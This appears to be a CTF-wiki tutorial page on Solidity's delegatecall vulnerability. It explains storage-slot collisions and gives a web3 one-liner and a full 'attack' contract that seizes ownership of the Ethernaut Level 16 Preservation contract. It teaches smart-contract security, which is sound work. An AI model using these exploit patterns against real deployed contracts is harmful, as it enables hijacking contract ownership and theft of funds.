# Delegatecall

> There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.

## Principle

### Three Call Functions

In Solidity, the call function family can implement cross-contract function calls, which includes three methods: call, delegatecall, and callcode.

#### Call Model

```
<address>.call(...) returns (bool)
<address>.callcode(...) returns (bool)
<address>.delegatecall(...) returns (bool)
```

These functions provide flexible ways to interact with contracts and can accept parameters of any length and any type. The parameters passed in are padded to 32 bytes and concatenated into a string sequence, which is parsed and executed by the EVM.

During a function call, the built-in variable `msg` in Solidity changes with the initiation of the call. `msg` holds the caller's information, including: the address that initiated the call, the transaction amount, the called function's character sequence, etc.

#### Similarities and Differences

* call: After the call, the built-in variable `msg` is modified to the caller, and the execution environment is the callee's runtime environment.
* delegatecall: After the call, the built-in variable `msg` is NOT modified to the caller, but the execution environment is the caller's runtime environment (equivalent to copying the callee's code into the caller's contract).
* callcode: After the call, the built-in variable `msg` is modified to the caller, but the execution environment is the caller's runtime environment.

!!! note
    Warning: "callcode" has been deprecated in favour of "delegatecall"

### Delegatecall Abuse

#### Design Intent

* Function prototype: `<address>.delegatecall(...) returns (bool)`
* The function is designed to use the code at the given address while using other information from the current contract (such as storage, balance, etc.)
* To some extent, it is also for code reuse

#### Threat Analysis

Referring to the function prototype, we know that a delegatecall has two parameters: `address` and `msg.data`.

* If `msg.data` is controllable, then any function at `address` can be called

```solidity
pragma solidity ^0.4.18;

contract Delegate {

    address public owner;

    function Delegate(address _owner) public {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {

    address public owner;
    Delegate delegate;

    function Delegation(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    function() public {
        if(delegate.delegatecall(msg.data)) {
            this;
        }
    }
}
```

For this example, how can the attacker become the owner?

We simply need to call the fake `pwn()` on Delegation, which will trigger Delegation's `fallback`. This way, the function signature hash of `pwn` will be placed in `msg.data[0:4]`, which will execute the delegate's `pwn()` to change the owner to ourselves, as shown below (this is caused by the controllability of `msg.data`):

```
contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)})
```

* If both `msg.data` and `address` are controllable, then any function at any `address` can be called

Similarly, the only additional condition is that `address` is controllable. No further analysis is needed.

#### Root Cause Analysis

```solidity
pragma solidity ^0.4.23;

contract A {
    address public c;
    address public b;
    
    function test() public returns (address a) {
        a = address(this);
        b = a;
    }
}

contract B {
    address public b;
    address public c;
    
    function withdelegatecall(address testaddress) public {
        testaddress.delegatecall(bytes4(keccak256("test()")));
    }
}
```

Look at the example above. Assuming contract A is deployed at address_a and contract B is deployed at address_b, when external account C calls withdelegatecall(address_a), what are the values of b and c variables in address_a and address_b? The results are as follows:

In the address_a contract: c = 0, b = 0; In the address_b contract: b = 0, c = address_b

What was modified is not the b variable in contract B, but rather the c variable in contract B.

![delegatecall](./figure/delegatecall.png)

sstore is the store-to-storage instruction. As we can see, it writes to storage position 1. Storage position 1 corresponds to variable c in contract B, while it corresponds to variable b in contract A. So in fact, when using delegatecall with Storage variables, it is not based on the variable name but on the variable's storage position. This allows us to achieve the purpose of overwriting related variables.

## Example

### Source

[ethernaut](https://ethernaut.openzeppelin.com/) Level 16

### Analysis

- When we call Preservation's `setFirstTime` function, it actually executes LibraryContract's `setTime` function through `delegatecall`, modifying slot 1, which means modifying the timeZone1Library variable.
- This way, we first call `setFirstTime` to modify the timeZone1Library variable to the address of our malicious contract, and the second call to `setFirstTime` will execute our arbitrary code.

### Exp

```solidity
pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c;
    Preservation target = Preservation(instance_address);
    function attack1() {
        target.setFirstTime(uint(address(this)));
    }
    function attack2() {
        target.setFirstTime(uint(0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2));
    }
    function setTime(uint _time) public {
        timeZone1Library = address(_time);
        timeZone2Library = address(_time);
        owner = address(_time);
    }
}
```

First call `attack1()`, then call `attack2()`.

### Result

![](./figure/result.png)

## Challenges

### RealWorld 2018
- Challenge Name: Acoraida Monica

### Balsn 2019
- Challenge Name: Creativity

### 5th Space 2020
- Challenge Name: SafeDelegatecall

### Huawei Kunpeng Computing 2020
- Challenge Name: boxgame

!!! note
    Note: Challenge attachments and related content can be found in the [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) repository.

